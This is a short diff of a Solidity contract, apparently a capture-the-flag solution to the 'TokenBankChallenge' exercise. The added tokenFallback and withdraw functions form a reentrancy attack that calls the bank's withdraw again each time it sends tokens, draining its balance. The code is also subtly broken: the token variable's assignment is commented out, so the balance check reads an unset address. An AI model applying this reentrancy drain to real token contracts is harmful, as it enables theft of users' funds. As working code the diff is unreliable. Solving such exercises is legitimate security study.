@@ -16,18 +16,28 @@ interface ISimpleERC223Token {
 contract TokenBankAnswer {
     ITokenBankChallenge bank;
     ISimpleERC223Token token;
+    uint counter = 0;
     function TokenBankAnswer(address _adr) public{
         bank = ITokenBankChallenge(_adr);
-        token = ISimpleERC223Token(bank.token());
-    }
-    
-    function attack() public {
-        
+        // token = ISimpleERC223Token(bank.token());
     }
 
-    function tokenFallback(address from, uint256, bytes) public {
+    
+    // function attack() public {
         
+    // }
+
+    function tokenFallback(address from, uint256, bytes) public {
+        if (msg.sender == address(bank)) {
+            withdraw();
+        }
     }
+
+    function withdraw() public {
+        if (token.balanceOf(address(bank)) > 0) {
+            bank.withdraw(bank.balanceOf(address(this)));
+    }
+}
 }
 
 // contract TokenBankAnswer {
